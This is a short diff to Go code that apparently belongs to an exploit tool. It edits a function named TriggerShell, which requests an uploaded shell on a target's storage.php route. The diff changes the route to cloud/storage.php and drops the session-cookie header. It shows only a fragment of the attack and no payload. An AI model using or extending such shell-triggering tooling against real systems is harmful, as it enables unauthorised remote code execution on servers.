@@ -173,7 +173,7 @@ func (c *Client) TriggerShell() (err error) {
 	var req *http.Request
 	var resp *http.Response
 	var sessidcookie string
-	var targetroute string = "storage.php"
+	var targetroute string = "cloud/storage.php"
 	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)
 
 	SysMsgNB("waiting for upload ...")
@@ -183,8 +183,6 @@ func (c *Client) TriggerShell() (err error) {
 	if err != nil {
 		return err
 	}
-	sessidcookie = c.Session.Jar.Cookies(req.URL)[0].String()
-	req.Header.Set("Cookie", sessidcookie)
 
 	resp, err = c.Session.Do(req)
 	if err != nil {
